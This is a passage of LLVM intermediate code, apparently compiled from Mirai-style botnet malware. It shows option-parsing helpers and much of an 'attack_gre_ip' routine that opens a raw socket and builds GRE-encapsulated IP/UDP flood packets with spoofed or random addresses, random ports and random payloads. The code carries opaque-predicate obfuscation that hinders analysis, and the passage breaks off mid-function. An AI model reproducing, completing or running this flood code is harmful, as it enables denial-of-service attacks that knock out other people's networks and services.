  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* %20, i32 10)
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

declare i32 @util_atoi(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

; <label>:19:                                     ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 19, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = add nsw i64 %79, %81
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %24, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %5
  br label %579

; <label>:87:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %111

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* @x.17
  %94 = load i32, i32* @y.18
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %92
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  %103 = load i32, i32* @x.17
  %104 = load i32, i32* @y.18
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %579

; <label>:111:                                    ; preds = %87
  store i32 0, i32* %11, align 4
  br label %112

; <label>:112:                                    ; preds = %278, %111
  %113 = load i32, i32* %11, align 4
  %114 = load i8, i8* %7, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  br i1 %116, label %117, label %281

; <label>:117:                                    ; preds = %112
  %118 = load i32, i32* @x.17
  %119 = load i32, i32* @y.18
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %117
  %126 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %25, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.grehdr*
  store %struct.grehdr* %139, %struct.grehdr** %26, align 8
  %140 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %141 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %140, i64 1
  %142 = bitcast %struct.grehdr* %141 to %struct.iphdr*
  store %struct.iphdr* %142, %struct.iphdr** %27, align 8
  %143 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i64 1
  %145 = bitcast %struct.iphdr* %144 to %struct.udphdr*
  store %struct.udphdr* %145, %struct.udphdr** %28, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
  %149 = and i8 %148, 15
  %150 = or i8 %149, 64
  store i8 %150, i8* %147, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = and i8 %153, -16
  %155 = or i8 %154, 5
  store i8 %155, i8* %152, align 4
  %156 = load i8, i8* %14, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i32, i32* %20, align 4
  %160 = sext i32 %159 to i64
  %161 = add i64 52, %160
  %162 = trunc i64 %161 to i16
  %163 = call zeroext i16 @htons(i16 zeroext %162) #7
  %164 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 2
  store i16 %163, i16* %165, align 2
  %166 = load i16, i16* %15, align 2
  %167 = call zeroext i16 @htons(i16 zeroext %166) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 3
  store i16 %167, i16* %169, align 4
  %170 = load i8, i8* %16, align 1
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 5
  store i8 %170, i8* %172, align 4
  %173 = load i8, i8* %17, align 1
  %174 = icmp ne i8 %173, 0
  %175 = load i32, i32* @x.17
  %176 = load i32, i32* @y.18
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart226, label %originalBB1alteredBB

originalBBpart226:                                ; preds = %originalBB1
  br i1 %174, label %183, label %187

; <label>:183:                                    ; preds = %originalBBpart226
  %184 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 4
  store i16 %184, i16* %186, align 2
  br label %187

; <label>:187:                                    ; preds = %183, %originalBBpart226
  %188 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 6
  store i8 47, i8* %189, align 1
  %190 = load i32, i32* %23, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 8
  store i32 %190, i32* %192, align 4
  %193 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %194 = load i32, i32* %11, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i64 %195
  %197 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %196, i32 0, i32 1
  %198 = load i32, i32* %197, align 4
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 9
  store i32 %198, i32* %200, align 4
  %201 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %202 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %203 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %202, i32 0, i32 1
  store i16 %201, i16* %203, align 2
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = bitcast %struct.iphdr* %204 to i8*
  %206 = load i8, i8* %205, align 4
  %207 = and i8 %206, 15
  %208 = or i8 %207, 64
  store i8 %208, i8* %205, align 4
  %209 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %210 = bitcast %struct.iphdr* %209 to i8*
  %211 = load i8, i8* %210, align 4
  %212 = and i8 %211, -16
  %213 = or i8 %212, 5
  store i8 %213, i8* %210, align 4
  %214 = load i8, i8* %14, align 1
  %215 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 1
  store i8 %214, i8* %216, align 1
  %217 = load i32, i32* %20, align 4
  %218 = sext i32 %217 to i64
  %219 = add i64 28, %218
  %220 = trunc i64 %219 to i16
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %223 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %222, i32 0, i32 2
  store i16 %221, i16* %223, align 2
  %224 = load i16, i16* %15, align 2
  %225 = zext i16 %224 to i32
  %226 = xor i32 %225, -1
  %227 = trunc i32 %226 to i16
  %228 = call zeroext i16 @htons(i16 zeroext %227) #7
  %229 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %230 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %229, i32 0, i32 3
  store i16 %228, i16* %230, align 4
  %231 = load i8, i8* %16, align 1
  %232 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 5
  store i8 %231, i8* %233, align 4
  %234 = load i8, i8* %17, align 1
  %235 = icmp ne i8 %234, 0
  br i1 %235, label %236, label %240

; <label>:236:                                    ; preds = %187
  %237 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %238 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 4
  store i16 %237, i16* %239, align 2
  br label %240

; <label>:240:                                    ; preds = %236, %187
  %241 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = call i32 @rand_next()
  %244 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i8, i8* %22, align 1
  %247 = icmp ne i8 %246, 0
  br i1 %247, label %248, label %254

; <label>:248:                                    ; preds = %240
  %249 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 9
  %251 = load i32, i32* %250, align 4
  %252 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 9
  store i32 %251, i32* %253, align 4
  br label %262

; <label>:254:                                    ; preds = %240
  %255 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 8
  %257 = load i32, i32* %256, align 4
  %258 = sub i32 %257, 1024
  %259 = xor i32 %258, -1
  %260 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %254, %248
  %263 = load i16, i16* %18, align 2
  %264 = call zeroext i16 @htons(i16 zeroext %263) #7
  %265 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %266 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %265, i32 0, i32 0
  store i16 %264, i16* %266, align 2
  %267 = load i16, i16* %19, align 2
  %268 = call zeroext i16 @htons(i16 zeroext %267) #7
  %269 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 1
  store i16 %268, i16* %270, align 2
  %271 = load i32, i32* %20, align 4
  %272 = sext i32 %271 to i64
  %273 = add i64 8, %272
  %274 = trunc i64 %273 to i16
  %275 = call zeroext i16 @htons(i16 zeroext %274) #7
  %276 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 2
  store i16 %275, i16* %277, align 2
  br label %278

; <label>:278:                                    ; preds = %262
  %279 = load i32, i32* %11, align 4
  %280 = add nsw i32 %279, 1
  store i32 %280, i32* %11, align 4
  br label %112

; <label>:281:                                    ; preds = %112
  br label %282

; <label>:282:                                    ; preds = %originalBBpart253, %281
  store i32 0, i32* %11, align 4
  br label %283

; <label>:283:                                    ; preds = %521, %282
  %284 = load i32, i32* %11, align 4
  %285 = load i8, i8* %7, align 1
  %286 = zext i8 %285 to i32
  %287 = icmp slt i32 %284, %286
  br i1 %287, label %288, label %524

; <label>:288:                                    ; preds = %283
  %289 = load i8**, i8*** %13, align 8
  %290 = load i32, i32* %11, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds i8*, i8** %289, i64 %291
  %293 = load i8*, i8** %292, align 8
  store i8* %293, i8** %29, align 8
  %294 = load i8*, i8** %29, align 8
  %295 = bitcast i8* %294 to %struct.iphdr*
  store %struct.iphdr* %295, %struct.iphdr** %30, align 8
  %296 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i64 1
  %298 = bitcast %struct.iphdr* %297 to %struct.grehdr*
  store %struct.grehdr* %298, %struct.grehdr** %31, align 8
  %299 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %300 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %299, i64 1
  %301 = bitcast %struct.grehdr* %300 to %struct.iphdr*
  store %struct.iphdr* %301, %struct.iphdr** %32, align 8
  %302 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i64 1
  %304 = bitcast %struct.iphdr* %303 to %struct.udphdr*
  store %struct.udphdr* %304, %struct.udphdr** %33, align 8
  %305 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %306 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %305, i64 1
  %307 = bitcast %struct.udphdr* %306 to i8*
  store i8* %307, i8** %34, align 8
  %308 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %309 = load i32, i32* %11, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i32 0, i32 2
  %313 = load i8, i8* %312, align 4
  %314 = zext i8 %313 to i32
  %315 = icmp slt i32 %314, 32
  br i1 %315, label %316, label %337

; <label>:316:                                    ; preds = %288
  %317 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %318 = load i32, i32* %11, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i32 0, i32 1
  %322 = load i32, i32* %321, align 4
  %323 = call i32 @ntohl(i32 %322) #7
  %324 = call i32 @rand_next()
  %325 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %326 = load i32, i32* %11, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %325, i64 %327
  %329 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %328, i32 0, i32 2
  %330 = load i8, i8* %329, align 4
  %331 = zext i8 %330 to i32
  %332 = lshr i32 %324, %331
  %333 = add i32 %323, %332
  %334 = call i32 @htonl(i32 %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 9
  store i32 %334, i32* %336, align 4
  br label %337

; <label>:337:                                    ; preds = %316, %288
  %338 = load i32, i32* %23, align 4
  %339 = icmp eq i32 %338, -1
  br i1 %339, label %340, label %344

; <label>:340:                                    ; preds = %337
  %341 = call i32 @rand_next()
  %342 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  br label %344

; <label>:344:                                    ; preds = %340, %337
  %345 = load i32, i32* @x.17
  %346 = load i32, i32* @y.18
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %344
  %353 = load i16, i16* %15, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  %356 = load i32, i32* @x.17
  %357 = load i32, i32* @y.18
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br i1 %355, label %364, label %379

; <label>:364:                                    ; preds = %originalBBpart230
  %365 = call i32 @rand_next()
  %366 = and i32 %365, 65535
  %367 = trunc i32 %366 to i16
  %368 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 3
  store i16 %367, i16* %369, align 4
  %370 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %371 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %370, i32 0, i32 3
  %372 = load i16, i16* %371, align 4
  %373 = zext i16 %372 to i32
  %374 = sub nsw i32 %373, 1000
  %375 = xor i32 %374, -1
  %376 = trunc i32 %375 to i16
  %377 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %378 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %377, i32 0, i32 3
  store i16 %376, i16* %378, align 4
  br label %379

; <label>:379:                                    ; preds = %364, %originalBBpart230
  %380 = load i32, i32* @x.17
  %381 = load i32, i32* @y.18
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %379
  %388 = load i16, i16* %18, align 2
  %389 = zext i16 %388 to i32
  %390 = icmp eq i32 %389, 65535
  %391 = load i32, i32* @x.17
  %392 = load i32, i32* @y.18
  %393 = sub i32 %391, 1
  %394 = mul i32 %391, %393
  %395 = urem i32 %394, 2
  %396 = icmp eq i32 %395, 0
  %397 = icmp slt i32 %392, 10
  %398 = or i1 %396, %397
  br i1 %398, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br i1 %390, label %399, label %405

; <label>:399:                                    ; preds = %originalBBpart234
  %400 = call i32 @rand_next()
  %401 = and i32 %400, 65535
  %402 = trunc i32 %401 to i16
  %403 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %404 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %403, i32 0, i32 0
  store i16 %402, i16* %404, align 2
  br label %405

; <label>:405:                                    ; preds = %399, %originalBBpart234
  %406 = load i16, i16* %19, align 2
  %407 = zext i16 %406 to i32
  %408 = icmp eq i32 %407, 65535
  br i1 %408, label %409, label %431

; <label>:409:                                    ; preds = %405
  %410 = load i32, i32* @x.17
  %411 = load i32, i32* @y.18
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %409
  %418 = call i32 @rand_next()
  %419 = and i32 %418, 65535
  %420 = trunc i32 %419 to i16
  %421 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %422 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %421, i32 0, i32 1
  store i16 %420, i16* %422, align 2
  %423 = load i32, i32* @x.17
  %424 = load i32, i32* @y.18
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart241, label %originalBB36alteredBB

originalBBpart241:                                ; preds = %originalBB36
  br label %431

; <label>:431:                                    ; preds = %originalBBpart241, %405
  %432 = load i8, i8* %22, align 1
  %433 = icmp ne i8 %432, 0
  br i1 %433, label %438, label %434

; <label>:434:                                    ; preds = %431
  %435 = call i32 @rand_next()
  %436 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 9
  store i32 %435, i32* %437, align 4
  br label %444

; <label>:438:                                    ; preds = %431
  %439 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 9
  %441 = load i32, i32* %440, align 4
  %442 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 9
  store i32 %441, i32* %443, align 4
  br label %444

; <label>:444:                                    ; preds = %438, %434
  %445 = load i8, i8* %21, align 1
  %446 = icmp ne i8 %445, 0
  br i1 %446, label %447, label %454

; <label>:447:                                    ; preds = %444
  %448 = load i8*, i8** %34, align 8
  %449 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %448, i32 %449)
  %450 = load i8*, i8** %34, align 8
  %451 = load i32, i32* %20, align 4
  %452 = sext i32 %451 to i64
  %453 = getelementptr inbounds i8, i8* %450, i64 %452
  store i8 0, i8* %453, align 1
  br label %454

; <label>:454:                                    ; preds = %447, %444
  %455 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 7
  store i16 0, i16* %456, align 2
  %457 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %458 = bitcast %struct.iphdr* %457 to i16*
  %459 = call zeroext i16 @checksum_generic(i16* %458, i32 20)
  %460 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 7
  store i16 %459, i16* %461, align 2
  %462 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 7
  store i16 0, i16* %463, align 2
  %464 = load %struct.iphdr*, %struct.iphdr** %32, align 8
